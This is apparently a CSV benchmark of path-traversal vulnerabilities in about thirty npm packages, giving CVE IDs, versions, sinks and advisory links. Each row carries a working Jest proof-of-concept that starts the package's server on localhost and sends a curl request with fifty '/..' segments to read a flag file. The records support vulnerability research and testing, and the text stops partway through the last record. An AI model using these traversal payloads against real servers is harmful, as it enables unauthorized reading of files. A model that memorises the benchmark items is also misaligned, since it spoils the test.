Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
path-traversal,,songcaihong,1.0.0,n/a,path-traversal/songcaihong_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in songcaihong"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/songcaihong/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:songcaihong:20180306; 
path-traversal,,zhanglina,1.0.0,n/a,path-traversal/zhanglina_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in zhanglina"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/zhanglina/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",n/a,index.js:10:8,https://security.snyk.io/vuln/npm:zhanglina:20180226; 
path-traversal,CVE-2020-8214,servey,2.2.0,3.0.0,path-traversal/servey_2.2.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in servey"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/servey/test/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,lib/server/index.js:60:21,https://security.snyk.io/vuln/SNYK-JS-SERVEY-174122; https://github.com/advisories/GHSA-v3px-6cc8-f8j3
path-traversal,,wenluhong111,1.0.0,n/a,path-traversal/wenluhong111_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wenluhong111"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wenluhong111/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  let end_serv = ""fuser -k 8888/tcp"";
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    exec(end_serv, (error, stdout) => {
      done();
    });
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:wenluhong111:20180306; 
path-traversal,CVE-2017-16120,liyujing,1.1.0,n/a,path-traversal/liyujing_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in liyujing"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/liyujing/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:liyujing:20170510; https://github.com/advisories/GHSA-m3j9-p4x2-97q6
path-traversal,,yjmyjmyjm,1.0.0,n/a,path-traversal/yjmyjmyjm_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in yjmyjmyjm"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/yjmyjmyjm/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:yjmyjmyjm:20170617; https://github.com/advisories/GHSA-g376-whg7-896m
path-traversal,,my-sn,1.0.1,n/a,path-traversal/my-sn_1.0.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in my-sn"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/my-sn/server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,server.js:41:7,https://security.snyk.io/vuln/npm:my-sn:20180226; 
path-traversal,,serverfff,1.1.1,n/a,path-traversal/serverfff_1.1.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverfff"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverfff/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:7:8,https://security.snyk.io/vuln/npm:serverfff:20180306; 
path-traversal,,lander,1.0.0,n/a,path-traversal/lander_1.0.0,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in lander"", (done) => {
  expect.assertions(1);
  const pkg = require(""lander"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8988/tcp"", () => {});
  } catch (e) {}
  pkg(8988);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8988${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:33:25,https://security.snyk.io/vuln/npm:lander:20180226; 
path-traversal,CVE-2017-16195,pytservce,1.0.0,n/a,path-traversal/pytservce_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in pytservce"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/pytservce/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",n/a,index.js:13:8,https://security.snyk.io/vuln/npm:pytservce:20170508; https://github.com/advisories/GHSA-jwjq-vp53-ph6m
path-traversal,,getstats,1.0.6,n/a,path-traversal/getstats_1.0.6,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9001/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in getstats"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9001/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/getstats/server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9001${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,server.js:37:12,https://security.snyk.io/vuln/npm:getstats:20180226; 
path-traversal,,gfm-srv,1.1.2,n/a,path-traversal/gfm-srv_1.1.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in gfm-srv"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/gfm-srv/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,lib/server.js:65:12,https://security.snyk.io/vuln/npm:gfm-srv:20180226; 
path-traversal,CVE-2017-16221,yzt,1.4.0,n/a,path-traversal/yzt_1.4.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9987/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in yzt"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9987/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/yzt/node.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9987${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,node.js:5:8,https://security.snyk.io/vuln/npm:yzt:20170509; https://github.com/advisories/GHSA-q48g-p5cx-c7c7
path-traversal,CVE-2019-15596,statics-server,0.0.9,n/a,path-traversal/statics-server_0.0.9,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in statics-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/statics-server/index.js"";
  server_process = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:37:20,https://security.snyk.io/vuln/SNYK-JS-STATICSSERVER-472065; https://github.com/advisories/GHSA-j27j-4w6m-8fc4
path-traversal,,hangersteak,0.2.2,0.2.5,path-traversal/hangersteak_0.2.2,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in hangersteak"", (done) => {
  expect.assertions(1);
  const http = require(""http"");
  const hangersteak = require(""hangersteak"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 3006/tcp"", () => {});
  } catch (e) {}
  const server = http.createServer((req, res) => {
    hangersteak(req, res);
  });
  server.listen(3006);
  let attack_string = `curl -v --path-as-is ""http://localhost:3006${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",https://github.com/eldoy/hangersteak/commit/9e853cced065c5a98f242c7ac75438d035f63532,lib/hangersteak.js:61:23,https://security.snyk.io/vuln/SNYK-JS-HANGERSTEAK-608973; 
path-traversal,,easy-node-server,1.2.1,n/a,path-traversal/easy-node-server_1.2.1,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in easy-node-server"", (done) => {
  expect.assertions(1);
  const pkg = require(""easy-node-server"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8895/tcp"", () => {});
  } catch (e) {}
  pkg.start({
    port: 8895,
    assetPath: __dirname,
  });
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8895${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:49:16,https://security.snyk.io/vuln/npm:easy-node-server:20180226; 
path-traversal,,ptest,1.0.0,n/a,path-traversal/ptest_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in ptest"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/ptest/server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,server.js:43:5,https://security.snyk.io/vuln/npm:ptest:20180226; 
path-traversal,,httpea,3.0.4,n/a,path-traversal/httpea_3.0.4,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in httpea"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/httpea/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:48:19,https://security.snyk.io/vuln/npm:httpea:20180226; 
path-traversal,,xingbaohai,1.0.0,n/a,path-traversal/xingbaohai_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in xingbaohai"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/xingbaohai/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:8:8,https://security.snyk.io/vuln/npm:xingbaohai:20180226; 
path-traversal,CVE-2017-16163,dylmomo,1.0.0,n/a,path-traversal/dylmomo_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in dylmomo"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/dylmomo/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:14:8,https://security.snyk.io/vuln/npm:dylmomo:20170518; https://github.com/advisories/GHSA-hpw4-m59j-9p52
path-traversal,CVE-2017-16201,zjjserver,1.0.0,n/a,path-traversal/zjjserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 4848/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in zjjserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 4848/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/zjjserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:4848${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",n/a,index.js:19:8,https://security.snyk.io/vuln/npm:zjjserver:20170509; https://github.com/advisories/GHSA-xgf5-5gjr-4hjq
path-traversal,,paopao613,1.0.0,n/a,path-traversal/paopao613_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in paopao613"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/paopao613/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:7:8,https://security.snyk.io/vuln/npm:paopao613:20180315; 
path-traversal,CVE-2018-16482,mcstatic,0.0.20,= 0.0.20,path-traversal/mcstatic_0.0.20,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in mcstatic"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/mcstatic/bin/mcstatic"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,lib/responseHandlers.js:23:21,https://security.snyk.io/vuln/npm:mcstatic:20180425; https://github.com/advisories/GHSA-cxmj-qjv6-vx9p
path-traversal,CVE-2017-16089,serverlyr,1.1.0,n/a,path-traversal/serverlyr_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverlyr"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverlyr/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:serverlyr:20170518; https://github.com/advisories/GHSA-46q2-93hm-52p5
path-traversal,CVE-2017-16108,gaoxiaotingtingting,1.1.0,n/a,path-traversal/gaoxiaotingtingting_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in gaoxiaotingtingting"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/gaoxiaotingtingting/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:gaoxiaotingtingting:20170510; https://github.com/advisories/GHSA-qhf6-vqq9-q2p7
path-traversal,,@vivaxy/here,3.1.0,3.2.2,path-traversal/@vivaxy-here_3.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 3000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in @vivaxy/here"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  try {
    a.execSync(""fuser -k 3000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/@vivaxy/here/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:3000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",https://github.com/vivaxy/here/commit/298dbab41344dfb7f95f66b1fa7b5cfb436bd4a2,lib/read-file.js:11:19,https://security.snyk.io/vuln/SNYK-JS-VIVAXYHERE-455285; 
path-traversal,CVE-2017-16101,serverwg,1.0.0,n/a,path-traversal/serverwg_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverwg"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverwg/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
